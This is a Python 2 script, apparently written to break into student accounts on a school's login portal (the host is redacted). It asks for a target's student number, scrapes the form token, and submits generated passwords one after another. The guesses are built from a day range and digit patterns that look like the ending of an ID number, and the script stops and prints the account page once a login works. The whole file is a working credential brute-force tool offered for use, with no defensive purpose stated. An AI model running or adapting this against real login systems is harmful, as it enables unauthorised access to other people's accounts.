import urllib
import urllib2
import cookielib
import re


class SchoolShit:

    def __init__(self):
        self.LoginUrl = "http://XXXXXXXXXXXXX/login"
        self.Username = ""
        self.Password = ""
        self.Cookie = cookielib.CookieJar()
        self.CookieHandler = urllib2.HTTPCookieProcessor(self.Cookie)
        self.Opener = urllib2.build_opener(self.CookieHandler)


        self.Header = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0"}
        self.Data = {"username":self.Username,
                     "password":self.Password,
                     "lt":"",
                     "execution":"e1s1",
                     "_eventId":"submit",
                     "submit":"%B5%C7%C2%BC",
                     }

    def SetUser(self, user):
        self.Username = user
        self.Data["username"] = user

    def SetPassword(self, password):
        self.Password = password
        self.Data["password"] = password
    

    def Login(self):
        self.Cookie.clear()
        Load = self.Opener.open(self.LoginUrl)
        Content = Load.read()
        Reg = r'name="lt" value="(.*)" />'
        Result = re.findall(Reg, Content)
        if len(Result) == 0:
            print "Fail to find -- 'It'."
            return False
        #print Result[0]
        self.Data["lt"] = Result[0]

        PostData = urllib.urlencode(self.Data)
        #print "Payload : " + PostData
        Req = urllib2.Request(self.LoginUrl, PostData, self.Header)
        
        Response = self.Opener.open(Req)
        Page = Response.read()
        #print Page

        if re.search(r'<li><a href="http://XXXXXXXXXXXXXX.aspx" target="_blank">', Page):
            print "Login success!"
            print Page
            return True
        else:
            print "Wrong passowrd"
            return False
        




def GenPwd(lo = 1, hi = 32):
    for idx1 in range(lo, hi):
        for idx2 in range(1400, 10000):
            tmp = '{0:0>2}{1:0>4}'.format(idx1, idx2)
            yield tmp
            
    for idx1 in range(lo, hi):
        for idx2 in range(0, 1000):
            tmp = '{0:0>2}{1:0>3}'.format(idx1, idx2)
            yield tmp+'x'
       
        

if __name__=='__main__':

    # Set birthday #
    lo = int(raw_input("Lower bound of first to digit:"))#
    hi = int(raw_input("Higher bound of first to digit:"))#
    g = GenPwd(lo,hi+1)#
    ################
    
    shit = SchoolShit()


    # Set student number ####
    student_num  = raw_input("Student number of target:")#
    shit.SetUser(student_num)#
    #########################
    
    while(True):

        try:
            p = next(g)
        except StopIteration as e:
            print 'Generator return value:', e.value
            break
        
       
        shit.SetPassword(p)

        print shit.Password
        
        if shit.Login():
            break

        
    
